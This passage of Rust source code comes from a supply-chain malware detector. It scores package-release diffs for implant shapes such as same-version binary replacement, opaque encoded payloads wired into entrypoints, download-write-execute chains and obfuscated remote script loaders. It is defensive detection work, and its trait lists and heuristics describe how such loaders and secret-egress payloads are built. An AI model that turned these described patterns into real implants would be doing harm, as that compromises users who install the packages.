        && new_id_contains(&["external-url", "remote-host-url", "tld-"]);
    let executable_capability_bundle = executable_capability_escalation(diff, bump);
    let binary_replacement = binary_replacement_anomaly(diff, bump).is_some();
    let opaque_runtime_payload =
        opaque_runtime_payload_anomaly(diff, bump, runtime_entrypoints).is_some();
    let runtime_graft = runtime_graft_anomaly(diff, bump, runtime_entrypoints).is_some();
    if focused_source
        || focused_source_with_cleanup
        || source_build_anomaly
        || cross_domain_cluster
        || endgame
        || dependency_with_fallback_load
        || dependency_backed_api
        || source_download_execute
        || remote_script_loader
        || added_encrypted_payload_archive
        || same_version_archive_replacement
        || nested_payload_cluster
        || nested_capability_cluster
        || encoded_payload_cluster
        || native_hook_cluster
        || native_build_hook_cluster
        || secret_egress_cluster
        || binary_replacement
        || opaque_runtime_payload
        || runtime_graft
        || executable_capability_bundle >= Severity::High
    {
        Severity::High
    } else {
        Severity::None
    }
}

#[derive(Debug)]
struct BinaryReplacementAnomaly {
    large_moves: usize,
    metric_families: usize,
}

/// Detect a rebuilt compiled artifact from content facts alone. This is the
/// trait-independent fallback for an unknown supply-chain payload: a repack of
/// the *same* version changed most scopes and radically altered several
/// independent metric families in one native/bytecode member.
///
/// The conjunction is intentionally strict. Reproducible-build noise can move
/// a timestamp or a handful of layout values, while an ordinary new release is
/// licensed by its version bump. Neither should become a hostile verdict.
fn binary_replacement_anomaly(
    diff: &DiffReportV1,
    bump: Option<Bump>,
) -> Option<BinaryReplacementAnomaly> {
    if !bump.is_some_and(|b| matches!(b.kind, BumpKind::Same))
        || !compact_change(&diff.summary)
        || diff.summary.overall_roc < 0.50
        || diff.summary.scope_roc.metrics < 0.30
    {
        return None;
    }

    diff.files
        .iter()
        .filter(|file| matches!(file.status, FileStatus::Changed))
        .filter(|file| member_type(file).is_some_and(|t| t.is_binary()))
        .filter_map(|file| {
            use cleave::types::Scope;

            // Require corroboration outside scalar metrics: a replacement
            // changes binary topology and at least one semantic fact surface.
            if !file.scopes.view(Scope::Sections).has_changes
                || !(file.scopes.view(Scope::Symbols).has_changes
                    || file.scopes.view(Scope::Kv).has_changes)
            {
                return None;
            }

            let metrics = file.scopes.metrics.as_ref()?;
            let mut families = HashSet::new();
            let mut large_moves = 0usize;
            for change in &metrics.changed {
                let path = change.new.path.as_str();
                if path.contains("mtime") || path.contains("timing") {
                    continue;
                }
                let (Some(old), Some(new)) = (change.old.value.as_f64(), change.new.value.as_f64())
                else {
                    continue;
                };
                let large = if old == 0.0 {
                    new.abs() >= 2.0
                } else {
                    (new - old).abs() / old.abs() >= 0.65
                };
                if !large {
                    continue;
                }
                large_moves += 1;
                families.insert(path.split(['.', '/']).next().unwrap_or(path));
            }

            (large_moves >= 4 && families.len() >= 3).then_some(BinaryReplacementAnomaly {
                large_moves,
                metric_families: families.len(),
            })
        })
        .max_by_key(|anomaly| (anomaly.metric_families, anomaly.large_moves))
}

#[derive(Debug)]
struct OpaqueRuntimePayloadAnomaly {
    entrypoint: String,
    payload: String,
    size: f64,
    lines: f64,
    encoded_ratio: f64,
    max_string: f64,
}

/// Detect a compact release that wires a highly opaque new source member into
/// an existing package runtime entrypoint. This deliberately uses graph,
/// topology, and numeric facts only: it remains useful when no trait knows the
/// decoder, cipher, VM, or platform API used by a future implant.
///
/// Every leg is needed. A minified bundle alone is ordinary; a large test
/// fixture alone is ordinary; and a package growing in a major release is
/// ordinary. A same/patch release nearly doubling while a declared entrypoint
/// starts naming a new, one-line, mostly-encoded source member is not.
fn opaque_runtime_payload_anomaly(
    diff: &DiffReportV1,
    bump: Option<Bump>,
    runtime_entrypoints: &HashSet<String>,
) -> Option<OpaqueRuntimePayloadAnomaly> {
    if !routine_release(bump)
        || !compact_change(&diff.summary)
        || diff.summary.overall_roc < 0.30
        || root_size_growth(diff).is_none_or(|growth| growth < 0.50)
    {
        return None;
    }

    let opaque_members = diff
        .files
        .iter()
        .filter(|file| matches!(file.status, FileStatus::Added))
        .filter(|file| member_type(file).is_some_and(|t| t.is_source_code()))
        .filter_map(|file| {
            let size = new_metric_value(file, "file.size")?;
            let lines = new_metric_value(file, "text.total_lines")?;
            let max_line = new_metric_value(file, "text.max_line_length")?;
            let encoded_ratio = new_metric_value(file, "text.encoded_string_ratio")?;
            let max_string = new_metric_value(file, "strings.max_length")?;
            let digit_ratio = new_metric_value(file, "text.digit_ratio").unwrap_or(0.0);
            let hex_strings = new_metric_value(file, "strings.hex_strings").unwrap_or(0.0);
            (size >= 1_024.0
                && lines <= 4.0
                && max_line >= 1_000.0
                && encoded_ratio >= 0.50
                && max_string >= 1_000.0
                && (digit_ratio >= 0.30 || hex_strings >= 4.0))
                .then_some((file, size, lines, encoded_ratio, max_string))
        });

    for (payload, size, lines, encoded_ratio, max_string) in opaque_members {
        let payload_path = display_member_path(&payload.path);
        for entrypoint in diff.files.iter().filter(|file| {
            matches!(file.status, FileStatus::Added | FileStatus::Changed)
                && runtime_entrypoints.contains(display_member_path(&file.path))
        }) {
            let Some(facts) = entrypoint.scopes.kv.as_ref() else {
                continue;
            };
            let gained_values = facts
                .added
                .iter()
                .map(|fact| &fact.value)
                .chain(facts.changed.iter().map(|change| &change.new.value));
            if gained_values
                .filter_map(serde_json::Value::as_str)
                .any(|value| {
                    local_reference_matches(
                        display_member_path(&entrypoint.path),
                        value,
                        payload_path,
                    )
                })
            {
                return Some(OpaqueRuntimePayloadAnomaly {
                    entrypoint: entrypoint.path.clone(),
                    payload: payload.path.clone(),
                    size,
                    lines,
                    encoded_ratio,
                    max_string,
                });
            }
        }
    }
    None
}

/// The current numeric value of a metric on an added or changed file.
fn new_metric_value(file: &FileDiffEntry, path: &str) -> Option<f64> {
    let metrics = file.scopes.metrics.as_ref()?;
    metrics
        .added
        .iter()
        .find(|metric| metric.path == path)
        .map(|metric| &metric.value)
        .or_else(|| {
            metrics
                .changed
                .iter()
                .find(|change| change.new.path == path)
                .map(|change| &change.new.value)
        })?
        .as_f64()
}

fn root_size_growth(diff: &DiffReportV1) -> Option<f64> {
    let root = diff.files.iter().find(|file| file.path == "<root>")?;
    let metrics = root.scopes.metrics.as_ref()?;
    let change = metrics
        .changed
        .iter()
        .find(|change| matches!(change.new.path.as_str(), "file.size" | "file.size_bytes"))?;
    let old = change.old.value.as_f64()?;
    let new = change.new.value.as_f64()?;
    (old > 0.0).then_some((new - old) / old)
}

/// Source extensions a module reference may leave off. Also the set that makes
/// a bare `payload.php` recognizable as a sibling file rather than a package
/// name — `include 'payload.php'` is the ordinary same-directory spelling in
/// the ecosystems this detector targets.
const SOURCE_EXTENSIONS: [&str; 8] = [".js", ".cjs", ".mjs", ".json", ".ts", ".py", ".rb", ".php"];

/// Resolve a path-looking source fact relative to its referrer and compare it
/// with an archive member. Relative paths, sibling filenames, and extensionless
/// module imports are accepted; URLs, bare package names, host-absolute paths,
/// and anything escaping the package root are rejected.
fn local_reference_matches(referrer: &str, reference: &str, target: &str) -> bool {
    let reference = reference.split(['?', '#']).next().unwrap_or(reference);
    // These are string *literals* lifted from source, not resolved paths, so a
    // leading `/` is almost always the tail of a concatenation — PHP's
    // `require __DIR__ . '/payload.php'` extracts as `/payload.php`. Reading it
    // as referrer-relative is therefore the right call, not host-absolute.
    let sibling = SOURCE_EXTENSIONS.iter().any(|ext| reference.ends_with(ext));
    if reference.is_empty()
        || reference.contains("://")
        || !(reference.starts_with('.') || reference.contains('/') || sibling)
    {
        return false;
    }

    let mut parts: Vec<&str> = referrer.split('/').collect();
    parts.pop();
    for part in reference.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                if parts.pop().is_none() {
                    return false;
                }
            }
            other => parts.push(other),
        }
    }
    let resolved = parts.join("/");
    // Either the reference named the member outright, or it left off an
    // extension the member carries.
    target
        .strip_prefix(resolved.as_str())
        .is_some_and(|rest| rest.is_empty() || SOURCE_EXTENSIONS.contains(&rest))
}

#[derive(Debug)]
struct RuntimeGraftAnomaly {
    entrypoint: String,
    payload: String,
    timestamp_spread: f64,
}

/// Detect a focused package repack that grafts a new externally-facing source
/// member onto the package's identity-bearing runtime entrypoint. Unlike the
/// opaque-payload branch, this catches readable implants. The archive timing
/// cluster is essential corroboration: both touched members must be singled
/// out as timestamp outliers inside a very narrow build window.
fn runtime_graft_anomaly(
    diff: &DiffReportV1,
    bump: Option<Bump>,
    runtime_entrypoints: &HashSet<String>,
) -> Option<RuntimeGraftAnomaly> {
    if !routine_release(bump) || !compact_change(&diff.summary) || diff.summary.overall_roc < 0.30 {
        return None;
    }
    let timestamp_spread = archive_timestamp_spread(diff)?;
    if timestamp_spread > 300.0 {
        return None;
    }
    // Gathered once, ahead of the loops: the alternative is re-scanning every
    // file for `<root>` on each payload *and* each entrypoint candidate.
    let outliers = timestamp_outlier_members(diff);

    for payload in diff.files.iter().filter(|file| {
        matches!(file.status, FileStatus::Added)
            && member_type(file).is_some_and(|t| t.is_source_code())
            && new_metric_value(file, "file.size").is_some_and(|size| size >= 512.0)
    }) {
        let payload_path = display_member_path(&payload.path);
        // Cheapest discriminator first — it rejects nearly every candidate, and
        // the string scan below is the expensive part.
        if !outliers.contains(payload_path) {
            continue;
        }
        let Some(payload_facts) = payload.scopes.kv.as_ref() else {
            continue;
        };
        let payload_values = payload_facts
            .added
            .iter()
            .map(|fact| &fact.value)
            .chain(payload_facts.changed.iter().map(|change| &change.new.value))
            .filter_map(serde_json::Value::as_str)
            .collect::<Vec<_>>();
        let external_url = payload_values
            .iter()
            .any(|value| value.contains("http://") || value.contains("https://"));
        let absolute_host_path = payload_values.iter().any(|value| {
            value.starts_with('/')
                && !value.starts_with("//")
                && value.trim_start_matches('/').contains('/')
        });
        if !external_url || !absolute_host_path {
            continue;
        }

        for entrypoint in diff.files.iter().filter(|file| {
            matches!(file.status, FileStatus::Added | FileStatus::Changed)
                && runtime_entrypoints.contains(display_member_path(&file.path))
        }) {
            let entrypoint_path = display_member_path(&entrypoint.path);
            if !outliers.contains(entrypoint_path) {
                continue;
            }
            let Some(facts) = entrypoint.scopes.kv.as_ref() else {
                continue;
            };
            let gained_reference = facts
                .added
                .iter()
                .map(|fact| &fact.value)
                .chain(facts.changed.iter().map(|change| &change.new.value))
                .filter_map(serde_json::Value::as_str)
                .any(|value| local_reference_matches(entrypoint_path, value, payload_path));
            if gained_reference {
                return Some(RuntimeGraftAnomaly {
                    entrypoint: entrypoint.path.clone(),
                    payload: payload.path.clone(),
                    timestamp_spread,
                });
            }
        }
    }
    None
}

/// The new side's archive-wide mtime spread, in seconds.
///
/// Read from `added` as well as `changed`: a kv diff omits unchanged entries, so
/// a repack that preserves the bulk mtimes and smears only the two touched
/// members — the shape this corroborates — leaves the spread in neither bucket
/// if only `changed` is consulted, and an old side with no mtimes at all puts it
/// in `added`.
fn archive_timestamp_spread(diff: &DiffReportV1) -> Option<f64> {
    let root = diff.files.iter().find(|file| file.path == "<root>")?;
    let facts = root.scopes.kv.as_ref()?;
    facts
        .added
        .iter()
        .chain(facts.changed.iter().map(|change| &change.new))
        .find(|fact| fact.path == "archive.timing.mtime_spread_seconds")?
        .value
        .as_f64()
}

/// The members the archive singled out as mtime outliers — the narrow build
/// window a graft leaves behind. cleave flattens the leaf array value-keyed, so
/// membership really does arrive as `added` entries.
fn timestamp_outlier_members(diff: &DiffReportV1) -> HashSet<&str> {
    diff.files
        .iter()
        .find(|file| file.path == "<root>")
        .and_then(|root| root.scopes.kv.as_ref())
        .into_iter()
        .flat_map(|facts| facts.added.iter())
        .filter(|fact| {
            fact.path
                .starts_with("archive.timing.mtime_outlier_members[]")
        })
        .filter_map(|fact| fact.value.as_str())
        .collect()
}

/// A package that retains only a tiny shell after deleting nearly all of its
/// behavior has the shape of an intentional endgame release. File deletion by
/// itself is ordinary cleanup; the high trait-ROC floor requires the removed
/// tree to account for most of the package's behavior as well as its content.
fn endgame_package_shape(summary: &DiffSummary) -> bool {
    summary.files_removed >= 100
        && summary.files_added <= 2
        && summary.files_changed <= 8
        && summary.overall_roc >= 0.50
        && summary.scope_roc.traits >= 0.75
}

/// A dependency addition paired with a new fallback module load is a compact
/// supply-chain shape even when neither signal is individually high. The file
/// count and overall movement bounds keep ordinary framework rewrites out.
fn dependency_with_fallback_load(a: &Assessment, diff: &DiffReportV1) -> bool {
    let summary = &diff.summary;
    compact_change(summary)
        && a.structure
            .facts
            .iter()
            .any(|fact| fact.label == "dependency")
        && has_new_class(a, "os/module")
        && summary.overall_roc <= 0.25
}

#[derive(Debug)]
struct DependencyApiExpansion {
    dependency: String,
    spec: String,
    entrypoint: String,
}

/// Detect a patch-level public API expansion backed by newly trusted,
/// floating pre-1.0 code. Each ingredient is common on its own; their join is
/// the supply-chain boundary change: the package both pulls a mutable young
/// dependency and exposes it through its declared runtime entrypoint.
fn dependency_backed_public_api_anomaly(
    diff: &DiffReportV1,
    bump: Option<Bump>,
    runtime_entrypoints: &HashSet<String>,
) -> Option<DependencyApiExpansion> {
    if !routine_release(bump) || !compact_change(&diff.summary) {
        return None;
    }

    let dependencies = diff.files.iter().flat_map(|file| {
        file.scopes
            .kv
            .as_ref()
            .into_iter()
            .flat_map(|facts| &facts.added)
            .filter_map(|fact| {
                // Peer dependencies describe a compatibility contract rather
                // than code this package newly installs itself.
                if fact.path.starts_with("peerDependencies.") {
                    return None;
                }
                let name = crate::rubric::dependency_name(&fact.path)?;
                let spec = fact.value.as_str()?;
                floating_pre_one_spec(spec).then(|| (name.to_string(), spec.to_string()))
            })
    });

    for (dependency, spec) in dependencies {
        let normalized_dependency = normalize_api_name(&dependency);
        let meaningful_tokens: HashSet<String> = dependency
            .split(|character: char| !character.is_ascii_alphanumeric())
            .map(str::to_ascii_lowercase)
            .filter(|token| {
                token.len() >= 3
                    && !matches!(
                        token.as_str(),
                        "api" | "core" | "js" | "lib" | "node" | "plugin" | "sdk" | "stream"
                    )
            })
            .collect();
        if meaningful_tokens.is_empty() {
            continue;
        }

        for entrypoint in diff.files.iter().filter(|file| {
            matches!(file.status, FileStatus::Added | FileStatus::Changed)
                && runtime_entrypoints.contains(display_member_path(&file.path))
        }) {
            let Some(symbols) = entrypoint.scopes.symbols.as_ref() else {
                continue;
            };
            let added: Vec<&str> = symbols
                .added
                .iter()
                .map(|symbol| symbol.symbol.as_str())
                .collect();
            let imports_dependency = added
                .iter()
                .any(|symbol| normalize_api_name(symbol) == normalized_dependency);
            let exposes_matching_member = added.iter().any(|symbol| {
                let Some((_, member)) = symbol.rsplit_once('.') else {
                    return false;
                };
                meaningful_tokens.contains(&normalize_api_name(member))
            });
            if imports_dependency && exposes_matching_member {
                return Some(DependencyApiExpansion {
                    dependency,
                    spec,
                    entrypoint: entrypoint.path.clone(),
                });
            }
        }
    }
    None
}

fn normalize_api_name(name: &str) -> String {
    name.chars()
        .filter(char::is_ascii_alphanumeric)
        .flat_map(char::to_lowercase)
        .collect()
}

fn floating_pre_one_spec(spec: &str) -> bool {
    let spec = spec.trim();
    let floating = spec.starts_with(['^', '~', '>', '<', '*'])
        || spec.eq_ignore_ascii_case("latest")
        || spec.split('.').any(|part| matches!(part, "x" | "X" | "*"));
    if !floating {
        return false;
    }
    let numeric = spec
        .trim_start_matches(['^', '~', '>', '<', '=', ' '])
        .trim_start_matches('v');
    numeric.starts_with("0.")
        || numeric == "0"
        || numeric.starts_with('*')
        || spec.eq_ignore_ascii_case("latest")
}

/// A package initializer or declared runtime entrypoint that newly downloads
/// bytes, writes them to disk, and launches a process is a complete delivery
/// chain even when the package already used HTTP and subprocesses elsewhere.
/// Keep every leg file-local and require platform gating to avoid summing
/// unrelated application behavior into a false payload. Returns the member path
/// carrying the chain.
fn source_download_write_execute_anomaly<'a>(
    diff: &'a DiffReportV1,
    bump: Option<Bump>,
    runtime_entrypoints: &HashSet<String>,
) -> Option<&'a str> {
    if !routine_release(bump) || !compact_change(&diff.summary) {
        return None;
    }

    diff.files.iter().find_map(|file| {
        if !matches!(file.status, FileStatus::Added | FileStatus::Changed) {
            return None;
        }
        let file_type = member_type(file).filter(filefacts::FileType::is_source_code)?;
        // A Python package initializer runs on import, so it is an entrypoint
        // whether or not the manifest ever names one.
        let path = display_member_path(&file.path);
        let auto_loaded = (file_type == filefacts::FileType::Python
            && path.rsplit('/').next() == Some("__init__.py"))
            || runtime_entrypoints.contains(path);
        if !auto_loaded {
            return None;
        }
        let traits = file.scopes.traits.as_ref()?;
        let ids = || {
            traits
                .added
                .iter()
                .map(|change| change.id.as_str())
                .chain(traits.changed.iter().map(|change| change.new.id.as_str()))
        };
        let has_class = |prefix: &str| {
            ids()
                .filter_map(crate::rubric::capability_class)
                .any(|class| class.starts_with(prefix))
        };
        let fetches_response = ids().any(|id| {
            let id = id.to_ascii_lowercase();
            id.contains("download")
                || id.contains("response-body-read")
                || id.contains("urlopen-response")
        });
        (fetches_response
            && has_class("communications/http")
            && has_class("process/create")
            && (has_class("fs/write") || has_class("fs/file"))
            && has_class("os/sysinfo"))
        .then_some(path)
    })
}

/// Whether one added-or-changed file gained *every* one of `suffixes` as a new
/// trait. Keeping the join file-local is the point: unrelated helpers scattered
/// across a normal web application must not add up to a loader.
fn file_gained_all_traits(diff: &DiffReportV1, suffixes: &[&str]) -> bool {
    diff.files.iter().any(|file| {
        if !matches!(file.status, FileStatus::Added | FileStatus::Changed) {
            return false;
        }
        let Some(traits) = file.scopes.traits.as_ref() else {
            return false;
        };
        suffixes.iter().all(|suffix| {
            traits
                .added
                .iter()
                .any(|trait_change| trait_change.id.ends_with(suffix))
        })
    })
}

/// A single changed file gained all parts of a concealed browser-side remote
/// loader: a long numeric character array, conversion through
/// `String.fromCharCode`, creation of a script element, and dynamic loading of
/// that script.
fn obfuscated_remote_script_loader(diff: &DiffReportV1) -> bool {
    file_gained_all_traits(
        diff,
        &[
            "::long-numeric-array-literal",
            "::fromcharcode-call",
            "::browser-create-script-element",
            "::dynamic-script-element-load",
        ],
    )
}

/// The non-obfuscated sibling of [`obfuscated_remote_script_loader`]: one file
/// gains script-element creation, dynamic loading, and a literal remote host.
/// This catches a payload appended plainly to a distributed browser bundle;
/// the modest-release guard belongs to [`change_shape_escalation`].
fn external_remote_script_loader(diff: &DiffReportV1) -> bool {
    file_gained_all_traits(
        diff,
        &[
            "::js-remote-host-url",
            "::browser-create-script-element",
            "::dynamic-script-element-load",
        ],
    )
}

/// The inverse of [`endgame_package_shape`], strengthened with direct evidence
/// that the old package's declared npm entrypoint was absent. This lets humans
/// and the LLM distinguish restoration of a stripped package from introduction
/// of a large new payload: generic capabilities inside the returning library
/// are baseline context unless direct implant evidence says otherwise.
fn restored_endgame_package_shape(diff: &DiffReportV1) -> bool {
    let summary = &diff.summary;
    let entrypoint_restored = diff.files.iter().any(|file| {
        file.scopes.traits.as_ref().is_some_and(|traits| {
            traits.removed.iter().any(|trait_change| {
                trait_change
                    .id
                    .ends_with("::npm-main-entrypoint-not-shipped")
            })
        })
    });
    entrypoint_restored
        && summary.files_added >= 100
        && summary.files_removed <= 2
        && summary.files_changed <= 8
        && summary.overall_roc >= 0.50
        && summary.scope_roc.traits >= 0.75
}

/// A newly-added executable can be an implant even when every individual API
/// looks ordinary. Score capability *families* and their combinations on the
/// file that gained them, then apply the version/package context here. The
/// family names are intentionally platform-neutral; the symbols and traits
/// that feed them can be Mach-O, ELF, PE, or source-language facts.
fn executable_capability_escalation(diff: &DiffReportV1, bump: Option<Bump>) -> Severity {
    // This heuristic is intentionally about a compact payload replacement.
    // A normal archive release can replace many compiled members at once; its
    // ordinary binary capabilities must not be treated as a single implant.
    if !compact_change(&diff.summary) {
        return Severity::None;
    }
    let package_context = package_payload_context(diff);
    let release_pressure = bump.map_or(0, |b| match b.kind {
        BumpKind::Same | BumpKind::Patch | BumpKind::Prerelease | BumpKind::Downgrade => 2,
        BumpKind::Minor => 1,
        BumpKind::Major => 0,
    });
    let mut best = 0u32;

    for file in &diff.files {
        if !matches!(file.status, FileStatus::Added | FileStatus::Changed) {
            continue;
        }
        let profile = capability_shape(file);
        if !profile.executable {
            continue;
        }
        // Normalized once: it runs `Version::detect` and `clean_name`, and the
        // left-hand side does not vary across the candidates being scanned.
        let replacement = matches!(file.status, FileStatus::Added) && {
            let normalized = normalized_member_path(&file.path);
            diff.files.iter().any(|other| {
                matches!(other.status, FileStatus::Removed)
                    && normalized_member_path(&other.path) == normalized
            })
        };
        let score = capability_shape_score(&profile, package_context, replacement);
        best = best.max(score);
    }

    // A patch/repack release is not expected to introduce a multi-domain
    // executable. A minor release gets a little more room, while a major
    // release relies on the ordinary trait rubric unless the new executable
    // also carries the strongest packaging concealment signal.
    let high = match release_pressure {
        2 => best >= 10,
        1 => best >= 13 && package_context,
        _ => best >= 16 && package_context,
    };
    if high {
        Severity::High
    } else if best >= 7 {
        Severity::Medium
    } else {
        Severity::None
    }
}

#[derive(Debug, Default)]
struct CapabilityShape {
    families: HashSet<&'static str>,
    executable: bool,
    resource_path: bool,
    archive_member: bool,
}

/// Directories that hold programs on the platforms isomer sees. Path shape is
/// the only executable evidence available when a member cannot be extracted, so
/// both the capability profile and the extraction fallback read the same list.
/// `/usr/bin/` and `/usr/local/bin/` need no entry — `/bin/` already covers them.
const EXEC_PATH_MARKERS: [&str; 5] = [
    "/contents/macos/",
    "/bin/",
    "/sbin/",
    "/libexec/",
    "\\system32\\",
];

/// Build a compact, explainable profile from the diff scopes. It deliberately
/// consumes the facts already emitted by cleave instead of requiring a new
/// platform-specific trait for every API spelling.
fn capability_shape(file: &FileDiffEntry) -> CapabilityShape {
    use cleave::types::Scope;

    let lower_path = file.path.to_ascii_lowercase();
    let mut shape = CapabilityShape {
        executable: member_type(file).is_some_and(|t| t.is_binary())
            || EXEC_PATH_MARKERS.iter().any(|m| lower_path.contains(m)),
        resource_path: [
            "/resources/",
            "/plugins/",
            "/extensions/",
            "/vendor/",
            "/assets/",
        ]
        .iter()
        .any(|part| lower_path.contains(part)),
        archive_member: file.path.contains("!!"),
        ..Default::default()
    };

    if let Some(traits) = file.scopes.traits.as_ref() {
        for trait_change in &traits.added {
            add_capability_text(&mut shape.families, &trait_change.id);
            add_capability_text(&mut shape.families, &trait_change.desc);
            shape.executable |= trait_is_executable(&trait_change.id);
        }
        for change in &traits.changed {
            add_capability_text(&mut shape.families, &change.new.id);
            add_capability_text(&mut shape.families, &change.new.desc);
            shape.executable |= trait_is_executable(&change.new.id);
        }
    }

    if let Some(symbols) = file.scopes.symbols.as_ref() {
        for symbol in &symbols.added {
            add_capability_text(&mut shape.families, &symbol.symbol);
            if let Some(library) = &symbol.library {
                add_capability_text(&mut shape.families, library);
            }
        }
        for change in &symbols.changed {
            add_capability_text(&mut shape.families, &change.new.symbol);
            if let Some(library) = &change.new.library {
                add_capability_text(&mut shape.families, library);
            }
        }
    }

    // Sections plus symbols are a useful cross-platform executable marker for
    // extensionless ELF/Mach-O/PE files. Source files normally have neither.
    shape.executable |= file.scopes.view(Scope::Sections).has_changes
        && file.scopes.view(Scope::Symbols).has_changes;

    if let Some(metrics) = file.scopes.metrics.as_ref() {
        for metric in &metrics.added {
            add_metric_signal(&mut shape, &metric.path);
        }
        for change in &metrics.changed {
            add_metric_signal(&mut shape, &change.new.path);
        }
    }
    if let Some(kv) = file.scopes.kv.as_ref() {
        for fact in &kv.added {
            add_capability_text(&mut shape.families, &fact.path);
            add_capability_text(&mut shape.families, &fact.value.to_string());
        }
        for change in &kv.changed {
            add_capability_text(&mut shape.families, &change.new.path);
            add_capability_text(&mut shape.families, &change.new.value.to_string());
        }
    }
    shape
}

fn add_metric_signal(shape: &mut CapabilityShape, path: &str) {
    let lower = path.to_ascii_lowercase();
    shape.executable |= lower.contains("sections.executable_count")
        || lower.starts_with("macho.")
        || lower.starts_with("elf.")
        || lower.starts_with("pe.");
    if lower.contains("overlay")
        || lower.contains("concealed")
        || lower.contains("high_entropy")
        || lower.contains("near_maximum_entropy")
        || lower.contains("packed")
    {
        shape.families.insert("concealment");
    }
}

fn trait_is_executable(id: &str) -> bool {
    let lower = id.to_ascii_lowercase();
    lower.contains("metadata/lang/compiled")
        || lower.contains("metadata/binary/")
        || lower.contains("macho")
        || lower.contains("elf")
        || lower.contains("pe-")
        || lower.contains("main-entry")
}

/// A content-level compiled-binary marker for package topology. This includes
/// native object files as well as executables, so user-facing text must call
/// these binary members rather than claiming every one is executable.
fn is_compiled_binary_file_type(file_type: filefacts::FileType) -> bool {
    file_type.is_binary()
}

/// Conservative fallback when member extraction is unavailable. This uses
/// executable package layout, never an extension: arbitrary `.bin`/`.dat`
/// cache or resource files must not become “payloads” merely by naming.
fn executable_member_layout(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    if EXEC_PATH_MARKERS.iter().any(|m| lower.contains(m)) {
        return true;
    }
    // Mach-O framework binaries conventionally live at Versions/A/<name>;
    // resource files are deeper (Versions/A/Resources/...) or hidden under a
    // signature directory, so require exactly one component after Versions/.
    lower
        .split_once("/versions/")
        .is_some_and(|(_, suffix)| suffix.matches('/').count() == 1)
}

fn package_payload_context(diff: &DiffReportV1) -> bool {
    let mut archive = false;
    let mut encrypted = false;
    let mut extension_mismatch = false;
    let mut executable_member = false;

    for file in &diff.files {
        let Some(traits) = file.scopes.traits.as_ref() else {
            continue;
        };
        for trait_change in traits
            .added
            .iter()
            .chain(traits.changed.iter().map(|change| &change.new))
        {
            let text = format!("{} {}", trait_change.id, trait_change.desc).to_ascii_lowercase();
            archive |= text.contains("archive") || text.contains("zip") || text.contains("7z");
            encrypted |= text.contains("encrypt") || text.contains("password");
            extension_mismatch |= text.contains("extension") && text.contains("mismatch");
            executable_member |= text.contains("executable") && text.contains("member");
        }
    }

    archive && executable_member && (encrypted || extension_mismatch)
}

fn capability_shape_score(
    shape: &CapabilityShape,
    package_context: bool,
    replacement: bool,
) -> u32 {
    let mut score = u32::try_from(shape.families.len()).unwrap_or(u32::MAX);
    let has = |name: &str| shape.families.contains(name);

    if has("communications") && has("process") {
        score += 2;
    }
    if has("communications") && has("remote-access") {
        score += 2;
    }
    if has("discovery") && has("communications") {
        score += 1;
    }
    if has("crypto") && has("communications") {
        score += 1;
    }
    if has("process") && has("remote-access") {
        score += 1;
    }
    if has("loading") && has("communications") {
        score += 1;
    }
    if shape.executable {
        score += 2;
    }
    if shape.resource_path || shape.archive_member {
        score += 2;
    }
    if package_context {
        score += 2;
    }
    if replacement {
        // A root directory rename must not hide a binary replacement. The
        // normalized suffix is enough to pair `App-1.2.3/bin/x` with
        // `App/bin/x` without trusting archive-specific naming conventions.
        score += 1;
    }
    score
}

/// The package/container size delta, when the synthetic root exposed it as a
/// metric. There can be many member sizes, so intentionally use only the root.
fn root_size_delta(diff: &DiffReportV1) -> Option<String> {
    let root = diff.files.iter().find(|f| f.path == "<root>")?;
    let metrics = root.scopes.metrics.as_ref()?;
    let change = metrics
        .changed
        .iter()
        .find(|c| c.new.path.ends_with("size_bytes"))?;
    let old = change.old.value.as_f64()?;
    let new = change.new.value.as_f64()?;
    let delta = if old != 0.0 {
        format!("{:+.1}%", (new - old) / old * 100.0)
    } else {
        "new".to_string()
    };
    Some(format!("{old:.0} -> {new:.0} bytes ({delta})"))
}

/// Rank numeric metric changes globally by absolute relative movement. This is
/// shared differential context for humans and the LLM: structural replacement
/// clues such as a 90% code-size collapse should not be hidden behind a single
/// aggregate metric ROC.
fn strongest_metric_changes(diff: &DiffReportV1, limit: usize) -> Vec<String> {
    let qualify_path = |path: &str| {
        !path.contains("mtime")
            && !path.contains("timing")
            && !path.contains("dependencies")
            && !path.contains("has_direct_loader_dep")
            && !path.contains("load_segment")
            && !path.ends_with("size_bytes")
    };
    let show_file = diff.files.len() > 1;
    let mut movers = Vec::new();
    for file in &diff.files {
        let Some(metrics) = file.scopes.metrics.as_ref() else {
            continue;
        };
        for change in &metrics.changed {
            let path = change.new.path.as_str();
            if !qualify_path(path) {
                continue;
            }
            let (Some(old), Some(new)) = (change.old.value.as_f64(), change.new.value.as_f64())
            else {
                continue;
            };
            if old == new {
                continue;
            }
            let importance = metric_change_importance(old, new);
            let delta = if old == 0.0 {
                "new".to_string()
            } else {
                format!("{:+.0}%", (new - old) / old.abs() * 100.0)
            };
            let label = if show_file {
                format!("{}:{path}", display_member_path(&file.path))
            } else {
                path.to_string()
            };
            let rendered = format!(
                "{label} {}→{} ({delta})",
                compact_metric_number(old),
                compact_metric_number(new)
            );
            movers.push((importance, label, rendered));
        }
    }
    // One row per label, keeping its strongest movement. `dedup_by` only drops
    // *adjacent* equals, so the labels have to be brought together first —
    // sorting by importance alone would leave two rows for the same label
    // (`a.tgz!!pkg/x.js` and `b.zip!!pkg/x.js` share one) sitting apart and both
    // would survive into the top `limit`.
    movers.sort_by(|a, b| a.1.cmp(&b.1).then_with(|| b.0.total_cmp(&a.0)));
    movers.dedup_by(|a, b| a.1 == b.1);
    movers.sort_by(|a, b| b.0.total_cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
    movers
        .into_iter()
        .take(limit)
        .map(|(_, _, rendered)| rendered)
        .collect()
}

/// Rank a numeric metric movement without letting every `0 -> 1` counter beat
/// a large proportional change. With a non-zero baseline, relative movement is
/// the useful comparison. At zero, gradually admit magnitude up to ten units:
/// a newly observed section count of six matters more than one incidental AST
/// call, while neither receives an artificial infinity.
pub(crate) fn metric_change_importance(old: f64, new: f64) -> f64 {
    if old == 0.0 {
        new.abs().min(10.0) / 10.0
    } else {
        (new - old).abs() / old.abs()
    }
}

/// Whole numbers plain, fractional ones with two decimals — so a ratio like
/// `0.28 → 0.05` never rounds to the meaningless `0→0`. Shared with the terminal
/// so a metric reads the same in every view.
pub(crate) fn compact_metric_number(value: f64) -> String {
    if value == value.trunc() {
        format!("{value:.0}")
    } else {
        format!("{value:.2}")
    }
}

